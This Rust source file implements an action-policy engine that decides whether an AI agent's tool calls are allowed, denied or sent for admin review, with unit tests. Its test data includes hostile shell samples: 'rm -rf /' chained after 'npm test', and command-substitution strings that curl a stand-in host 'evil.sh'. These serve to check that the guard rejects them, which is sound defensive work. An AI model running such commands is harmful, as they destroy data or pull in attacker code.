//! Tool action-policy evaluation, command matching, and rule storage.

use async_trait::async_trait;
use globset::Glob;
use moa_core::shell::{has_action_policy_unsafe_shell_syntax, split_shell_chain};
use moa_core::{
    ActionPolicyEffect, ActionPolicyRule, ActionRuleScope, MoaConfig, Result, SessionMeta,
    ToolPolicyInput, UserId, WorkspaceId,
};

/// Reserved workspace id used for deployment-global action-policy rules.
pub const GLOBAL_ACTION_POLICY_WORKSPACE_ID: &str = "global";

/// Persistent action-policy rule storage used by policy-aware tool routing.
#[async_trait]
pub trait ActionPolicyRuleStore: Send + Sync {
    /// Lists action-policy rules visible to one workspace user and tool.
    async fn list_action_policy_rules_for_tool(
        &self,
        workspace_id: &WorkspaceId,
        user_id: &UserId,
        tool: &str,
    ) -> Result<Vec<ActionPolicyRule>>;

    /// Creates or updates an action-policy rule.
    async fn upsert_action_policy_rule(&self, rule: ActionPolicyRule) -> Result<()>;

    /// Deletes an action-policy rule by tool and pattern.
    async fn delete_action_policy_rule(
        &self,
        workspace_id: &WorkspaceId,
        user_id: Option<&UserId>,
        tool: &str,
        pattern: &str,
    ) -> Result<()>;
}

/// Session-scoped inputs required for tool policy evaluation.
#[derive(Debug, Clone)]
pub struct ActionPolicyContext {
    /// Workspace associated with the current session.
    pub workspace_id: WorkspaceId,
    /// User associated with the current session.
    pub user_id: UserId,
}

impl ActionPolicyContext {
    /// Creates a policy context from a session metadata record.
    pub fn from_session(session: &SessionMeta) -> Self {
        Self {
            workspace_id: session.workspace_id.clone(),
            user_id: session.user_id.clone(),
        }
    }
}

/// Result of evaluating one tool invocation against the current policy set.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ActionPolicyCheck {
    /// Effect to apply for this invocation.
    pub effect: ActionPolicyEffect,
    /// Optional human-readable reason for the decision.
    pub reason: Option<String>,
    /// Rule that matched, if any.
    pub matched_rule: Option<ActionPolicyRule>,
}

/// Policy engine for tool action decisions.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ActionPolicies {
    default_effect: ActionPolicyEffect,
    admin_review: Vec<String>,
    always_deny: Vec<String>,
}

impl ActionPolicies {
    /// Creates policies from the loaded MOA config.
    pub fn from_config(config: &MoaConfig) -> Self {
        Self {
            default_effect: config.permissions.default_effect,
            admin_review: config.permissions.admin_review.clone(),
            always_deny: config.permissions.always_deny.clone(),
        }
    }

    /// Evaluates a tool invocation using persistent rules, config defaults, and tool metadata.
    pub fn check(
        &self,
        input: &ToolPolicyInput,
        ctx: &ActionPolicyContext,
        rules: &[ActionPolicyRule],
    ) -> Result<ActionPolicyCheck> {
        let mut matched_rule: Option<ActionPolicyRule> = None;
        for rule in rules {
            if !rule_visible_to_context(rule, ctx) {
                continue;
            }
            if rule.tool != input.tool_name {
                continue;
            }
            if rule_matches(rule, &input.tool_name, &input.normalized_input) {
                matched_rule = Some(match matched_rule {
                    Some(current)
                        if stricter_effect(current.effect, rule.effect) == current.effect =>
                    {
                        current
                    }
                    _ => rule.clone(),
                });
            }
        }

        let configured = self.configured_tool_effect(&input.tool_name);
        if let Some(rule) = matched_rule {
            let (effect, reason) = match configured {
                Some((configured_effect, configured_reason)) => {
                    let effect = stricter_effect(rule.effect, configured_effect);
                    let reason = if effect == configured_effect && effect != rule.effect {
                        Some(configured_reason)
                    } else {
                        rule.reason.clone()
                    };
                    (effect, reason)
                }
                None => (rule.effect, rule.reason.clone()),
            };
            return Ok(ActionPolicyCheck {
                effect,
                reason,
                matched_rule: Some(rule),
            });
        }

        if let Some((effect, reason)) = configured {
            return Ok(ActionPolicyCheck {
                effect,
                reason: Some(reason),
                matched_rule: None,
            });
        }

        let effect = stricter_effect(input.default_effect, self.default_effect);

        Ok(ActionPolicyCheck {
            effect,
            reason: None,
            matched_rule: None,
        })
    }

    fn configured_tool_effect(&self, tool_name: &str) -> Option<(ActionPolicyEffect, String)> {
        if self
            .always_deny
            .iter()
            .any(|candidate| candidate == tool_name)
        {
            return Some((
                ActionPolicyEffect::Deny,
                "tool is denied by action-policy config".to_string(),
            ));
        }

        if self
            .admin_review
            .iter()
            .any(|candidate| candidate == tool_name)
        {
            return Some((
                ActionPolicyEffect::AdminReview,
                "tool requires workspace admin review by config".to_string(),
            ));
        }

        None
    }
}

impl Default for ActionPolicies {
    fn default() -> Self {
        Self::from_config(&MoaConfig::default())
    }
}

/// Performs glob matching against a normalized tool input string.
pub fn glob_match(pattern: &str, candidate: &str) -> bool {
    Glob::new(pattern)
        .map(|glob| glob.compile_matcher().is_match(candidate))
        .unwrap_or(false)
}

/// Parses a shell command and matches it against a rule pattern.
pub fn parse_and_match_command(command: &str, rule_pattern: &str) -> bool {
    if has_action_policy_unsafe_shell_syntax(command) {
        return false;
    }

    let sub_commands = split_shell_chain(command);
    if sub_commands.len() > 1 {
        return sub_commands
            .iter()
            .all(|sub_command| glob_match(rule_pattern, sub_command));
    }

    shell_words::split(command)
        .map(|tokens| glob_match(rule_pattern, &tokens.join(" ")))
        .unwrap_or_else(|_| glob_match(rule_pattern, command.trim()))
}

fn rule_visible_to_context(rule: &ActionPolicyRule, ctx: &ActionPolicyContext) -> bool {
    match rule.scope {
        ActionRuleScope::Global
            if rule.workspace_id.0.as_str() == GLOBAL_ACTION_POLICY_WORKSPACE_ID => {}
        ActionRuleScope::Workspace
            if rule.workspace_id == ctx.workspace_id
                && rule.workspace_id.0.as_str() != GLOBAL_ACTION_POLICY_WORKSPACE_ID => {}
        _ => return false,
    }

    rule.user_id
        .as_ref()
        .is_none_or(|user_id| user_id == &ctx.user_id)
}

/// Returns the strictest outcome from two action-policy effects.
#[must_use]
pub fn stricter_effect(left: ActionPolicyEffect, right: ActionPolicyEffect) -> ActionPolicyEffect {
    match (left, right) {
        (ActionPolicyEffect::Deny, _) | (_, ActionPolicyEffect::Deny) => ActionPolicyEffect::Deny,
        (ActionPolicyEffect::AdminReview, _) | (_, ActionPolicyEffect::AdminReview) => {
            ActionPolicyEffect::AdminReview
        }
        (ActionPolicyEffect::Allow, ActionPolicyEffect::Allow) => ActionPolicyEffect::Allow,
    }
}

fn rule_matches(rule: &ActionPolicyRule, tool: &str, normalized_input: &str) -> bool {
    if tool == "bash" {
        return parse_and_match_command(normalized_input, &rule.pattern);
    }

    glob_match(&rule.pattern, normalized_input)
}

#[cfg(test)]
mod tests {
    use chrono::Utc;
    use moa_core::shell::split_shell_chain;
    use moa_core::{
        ActionPolicyEffect, ActionPolicyRule, ActionRuleScope, ModelId, RiskLevel, SessionMeta,
        ToolPolicyInput, UserId, WorkspaceId,
    };
    use uuid::Uuid;

    use super::{
        ActionPolicies, ActionPolicyContext, GLOBAL_ACTION_POLICY_WORKSPACE_ID,
        parse_and_match_command,
    };

    fn session() -> SessionMeta {
        SessionMeta {
            workspace_id: WorkspaceId::new("workspace"),
            user_id: UserId::new("user"),
            model: ModelId::new("claude-sonnet-4-6"),
            ..SessionMeta::default()
        }
    }

    #[test]
    fn tools_default_to_allow_in_auto_mode() {
        // Pins: auto mode executes policy-valid actions by default instead of blocking on review.
        let policies = ActionPolicies::default();
        let ctx = ActionPolicyContext::from_session(&session());

        let read = policies
            .check(
                &ToolPolicyInput {
                    tool_name: "file_read".to_string(),
                    normalized_input: "src/lib.rs".to_string(),
                    input_summary: "Path: src/lib.rs".to_string(),
                    risk_level: RiskLevel::Low,
                    default_effect: ActionPolicyEffect::Allow,
                    action_class: moa_core::ActionClass::Read,
                },
                &ctx,
                &[],
            )
            .unwrap();
        let bash = policies
            .check(
                &ToolPolicyInput {
                    tool_name: "bash".to_string(),
                    normalized_input: "npm test".to_string(),
                    input_summary: "Command: npm test".to_string(),
                    risk_level: RiskLevel::High,
                    default_effect: ActionPolicyEffect::Allow,
                    action_class: moa_core::ActionClass::CommandExecution,
                },
                &ctx,
                &[],
            )
            .unwrap();

        assert_eq!(read.effect, ActionPolicyEffect::Allow);
        assert_eq!(bash.effect, ActionPolicyEffect::Allow);
    }

    #[test]
    fn persistent_rule_matching_uses_glob_patterns() {
        // Pins: persisted action-policy rules can tighten the tool default effect.
        let policies = ActionPolicies::default();
        let ctx = ActionPolicyContext::from_session(&session());
        let rules = vec![ActionPolicyRule {
            id: Uuid::now_v7(),
            workspace_id: WorkspaceId::new("workspace"),
            tool: "file_write".to_string(),
            pattern: "src/*.rs".to_string(),
            user_id: None,
            effect: ActionPolicyEffect::AdminReview,
            scope: ActionRuleScope::Workspace,
            reason: Some("review source edits".to_string()),
            created_by: UserId::new("user"),
            created_at: Utc::now(),
        }];

        let check = policies
            .check(
                &ToolPolicyInput {
                    tool_name: "file_write".to_string(),
                    normalized_input: "src/lib.rs".to_string(),
                    input_summary: "Path: src/lib.rs".to_string(),
                    risk_level: RiskLevel::Medium,
                    default_effect: ActionPolicyEffect::Allow,
                    action_class: moa_core::ActionClass::LocalWrite,
                },
                &ctx,
                &rules,
            )
            .unwrap();

        assert_eq!(check.effect, ActionPolicyEffect::AdminReview);
        assert_eq!(check.reason.as_deref(), Some("review source edits"));
        assert!(check.matched_rule.is_some());
    }

    #[test]
    fn strictest_matching_persistent_rule_wins() {
        // Pins: broad allow rules cannot shadow a stricter matching rule.
        let policies = ActionPolicies::default();
        let ctx = ActionPolicyContext::from_session(&session());
        let rules = vec![
            ActionPolicyRule {
                id: Uuid::now_v7(),
                workspace_id: WorkspaceId::new("workspace"),
                tool: "bash".to_string(),
                pattern: "git *".to_string(),
                user_id: None,
                effect: ActionPolicyEffect::Allow,
                scope: ActionRuleScope::Workspace,
                reason: Some("allow git".to_string()),
                created_by: UserId::new("admin"),
                created_at: Utc::now(),
            },
            ActionPolicyRule {
                id: Uuid::now_v7(),
                workspace_id: WorkspaceId::new("workspace"),
                tool: "bash".to_string(),
                pattern: "git push".to_string(),
                user_id: None,
                effect: ActionPolicyEffect::Deny,
                scope: ActionRuleScope::Workspace,
                reason: Some("deny pushes".to_string()),
                created_by: UserId::new("admin"),
                created_at: Utc::now(),
            },
        ];

        let check = policies
            .check(
                &ToolPolicyInput {
                    tool_name: "bash".to_string(),
                    normalized_input: "git push".to_string(),
                    input_summary: "Command: git push".to_string(),
                    risk_level: RiskLevel::High,
                    default_effect: ActionPolicyEffect::Allow,
                    action_class: moa_core::ActionClass::CommandExecution,
                },
                &ctx,
                &rules,
            )
            .expect("policy evaluation");

        assert_eq!(check.effect, ActionPolicyEffect::Deny);
        assert_eq!(check.reason.as_deref(), Some("deny pushes"));
        assert_eq!(
            check.matched_rule.expect("matched rule").pattern,
            "git push"
        );
    }

    #[test]
    fn user_scoped_rules_only_match_the_current_user() {
        // Pins: a user-scoped action-policy rule must not affect other workspace users.
        let policies = ActionPolicies::default();
        let rule = ActionPolicyRule {
            id: Uuid::now_v7(),
            workspace_id: WorkspaceId::new("workspace"),
            tool: "bash".to_string(),
            pattern: "git push".to_string(),
            user_id: Some(UserId::new("target-user")),
            effect: ActionPolicyEffect::Deny,
            scope: ActionRuleScope::Workspace,
            reason: Some("target user only".to_string()),
            created_by: UserId::new("admin"),
            created_at: Utc::now(),
        };
        let input = ToolPolicyInput {
            tool_name: "bash".to_string(),
            normalized_input: "git push".to_string(),
            input_summary: "Command: git push".to_string(),
            risk_level: RiskLevel::High,
            default_effect: ActionPolicyEffect::Allow,
            action_class: moa_core::ActionClass::CommandExecution,
        };

        let other_session = SessionMeta {
            workspace_id: WorkspaceId::new("workspace"),
            user_id: UserId::new("other-user"),
            model: ModelId::new("claude-sonnet-4-6"),
            ..SessionMeta::default()
        };
        let other_check = policies
            .check(
                &input,
                &ActionPolicyContext::from_session(&other_session),
                std::slice::from_ref(&rule),
            )
            .expect("policy evaluation for other user");
        assert_eq!(other_check.effect, ActionPolicyEffect::Allow);
        assert!(other_check.matched_rule.is_none());

        let target_session = SessionMeta {
            workspace_id: WorkspaceId::new("workspace"),
            user_id: UserId::new("target-user"),
            model: ModelId::new("claude-sonnet-4-6"),
            ..SessionMeta::default()
        };
        let target_check = policies
            .check(
                &input,
                &ActionPolicyContext::from_session(&target_session),
                &[rule],
            )
            .expect("policy evaluation for target user");
        assert_eq!(target_check.effect, ActionPolicyEffect::Deny);
        assert!(target_check.matched_rule.is_some());
    }

    #[test]
    fn default_policy_uses_the_stricter_config_or_tool_effect() {
        // Pins: config default deny/admin-review cannot be weakened by a permissive tool default, and stricter tool defaults still win.
        let ctx = ActionPolicyContext::from_session(&session());
        let input = ToolPolicyInput {
            tool_name: "external_write".to_string(),
            normalized_input: "deploy production".to_string(),
            input_summary: "deploy production".to_string(),
            risk_level: RiskLevel::High,
            default_effect: ActionPolicyEffect::Allow,
            action_class: moa_core::ActionClass::Deployment,
        };

        let admin_review_policy = ActionPolicies {
            default_effect: ActionPolicyEffect::AdminReview,
            admin_review: Vec::new(),
            always_deny: Vec::new(),
        };
        assert_eq!(
            admin_review_policy
                .check(&input, &ctx, &[])
                .expect("policy check")
                .effect,
            ActionPolicyEffect::AdminReview
        );

        let deny_policy = ActionPolicies {
            default_effect: ActionPolicyEffect::Deny,
            admin_review: Vec::new(),
            always_deny: Vec::new(),
        };
        let tool_admin_review = ToolPolicyInput {
            default_effect: ActionPolicyEffect::AdminReview,
            ..input
        };
        assert_eq!(
            deny_policy
                .check(&tool_admin_review, &ctx, &[])
                .expect("policy check")
                .effect,
            ActionPolicyEffect::Deny
        );
    }

    #[test]
    fn configured_tool_policy_cannot_be_weakened_by_persisted_allow_rule() {
        // Pins: deployment-level deny/review config is a floor, not a workspace-rule suggestion.
        let policies = ActionPolicies {
            default_effect: ActionPolicyEffect::Allow,
            admin_review: Vec::new(),
            always_deny: vec!["bash".to_string()],
        };
        let ctx = ActionPolicyContext::from_session(&session());
        let allow_rule = ActionPolicyRule {
            id: Uuid::now_v7(),
            workspace_id: WorkspaceId::new("workspace"),
            tool: "bash".to_string(),
            pattern: "git status".to_string(),
            user_id: None,
            effect: ActionPolicyEffect::Allow,
            scope: ActionRuleScope::Workspace,
            reason: Some("allow status".to_string()),
            created_by: UserId::new("admin"),
            created_at: Utc::now(),
        };

        let check = policies
            .check(
                &ToolPolicyInput {
                    tool_name: "bash".to_string(),
                    normalized_input: "git status".to_string(),
                    input_summary: "Command: git status".to_string(),
                    risk_level: RiskLevel::Low,
                    default_effect: ActionPolicyEffect::Allow,
                    action_class: moa_core::ActionClass::CommandExecution,
                },
                &ctx,
                &[allow_rule],
            )
            .expect("policy evaluation");

        assert_eq!(check.effect, ActionPolicyEffect::Deny);
        assert_eq!(
            check.reason.as_deref(),
            Some("tool is denied by action-policy config")
        );
        assert_eq!(
            check.matched_rule.expect("matched rule").pattern,
            "git status"
        );
    }

    #[test]
    fn global_rules_require_reserved_workspace_id() {
        // Pins: a global-scoped row stored under a normal workspace id is not visible cross-workspace.
        let policies = ActionPolicies::default();
        let ctx = ActionPolicyContext::from_session(&SessionMeta {
            workspace_id: WorkspaceId::new("other-workspace"),
            user_id: UserId::new("user"),
            model: ModelId::new("claude-sonnet-4-6"),
            ..SessionMeta::default()
        });
        let input = ToolPolicyInput {
            tool_name: "bash".to_string(),
            normalized_input: "git push".to_string(),
            input_summary: "Command: git push".to_string(),
            risk_level: RiskLevel::High,
            default_effect: ActionPolicyEffect::Allow,
            action_class: moa_core::ActionClass::CommandExecution,
        };
        let stale_global_rule = ActionPolicyRule {
            id: Uuid::now_v7(),
            workspace_id: WorkspaceId::new("source-workspace"),
            tool: "bash".to_string(),
            pattern: "git push".to_string(),
            user_id: None,
            effect: ActionPolicyEffect::Deny,
            scope: ActionRuleScope::Global,
            reason: Some("bad global row".to_string()),
            created_by: UserId::new("admin"),
            created_at: Utc::now(),
        };
        let valid_global_rule = ActionPolicyRule {
            workspace_id: WorkspaceId::new(GLOBAL_ACTION_POLICY_WORKSPACE_ID),
            reason: Some("reserved global row".to_string()),
            ..stale_global_rule.clone()
        };

        assert_eq!(
            policies
                .check(&input, &ctx, &[stale_global_rule])
                .expect("stale global check")
                .effect,
            ActionPolicyEffect::Allow
        );
        let check = policies
            .check(&input, &ctx, &[valid_global_rule])
            .expect("valid global check");
        assert_eq!(check.effect, ActionPolicyEffect::Deny);
        assert_eq!(check.reason.as_deref(), Some("reserved global row"));
    }

    #[test]
    fn reserved_global_workspace_id_is_not_a_workspace_scope() {
        // Pins: the reserved global sentinel cannot accidentally behave as a normal workspace rule.
        let policies = ActionPolicies::default();
        let ctx = ActionPolicyContext::from_session(&SessionMeta {
            workspace_id: WorkspaceId::new(GLOBAL_ACTION_POLICY_WORKSPACE_ID),
            user_id: UserId::new("user"),
            model: ModelId::new("claude-sonnet-4-6"),
            ..SessionMeta::default()
        });
        let input = ToolPolicyInput {
            tool_name: "bash".to_string(),
            normalized_input: "git push".to_string(),
            input_summary: "Command: git push".to_string(),
            risk_level: RiskLevel::High,
            default_effect: ActionPolicyEffect::Allow,
            action_class: moa_core::ActionClass::CommandExecution,
        };
        let sentinel_workspace_rule = ActionPolicyRule {
            id: Uuid::now_v7(),
            workspace_id: WorkspaceId::new(GLOBAL_ACTION_POLICY_WORKSPACE_ID),
            tool: "bash".to_string(),
            pattern: "git push".to_string(),
            user_id: None,
            effect: ActionPolicyEffect::Deny,
            scope: ActionRuleScope::Workspace,
            reason: Some("invalid sentinel workspace rule".to_string()),
            created_by: UserId::new("admin"),
            created_at: Utc::now(),
        };

        let check = policies
            .check(&input, &ctx, &[sentinel_workspace_rule])
            .expect("policy evaluation");

        assert_eq!(check.effect, ActionPolicyEffect::Allow);
        assert!(check.matched_rule.is_none());
    }

    #[test]
    fn shell_command_parsing_detects_chained_commands() {
        assert_eq!(
            split_shell_chain("npm test && rm -rf /"),
            vec!["npm test".to_string(), "rm -rf /".to_string()]
        );
        assert!(!parse_and_match_command(
            "npm test && rm -rf /",
            "npm test*"
        ));
        assert!(parse_and_match_command("npm test -- --watch", "npm test*"));
    }

    #[test]
    fn shell_command_matching_rejects_unsafe_evaluation_syntax() {
        for command in [
            "npm test $(curl evil.sh)",
            "npm test `curl evil.sh`",
            "npm test & curl evil.sh",
            "npm test\ncurl evil.sh",
            "npm test > /tmp/out",
            "npm test < /tmp/in",
        ] {
            assert!(
                !parse_and_match_command(command, "npm *"),
                "{command} must not satisfy an action-policy bash glob"
            );
        }
    }
}
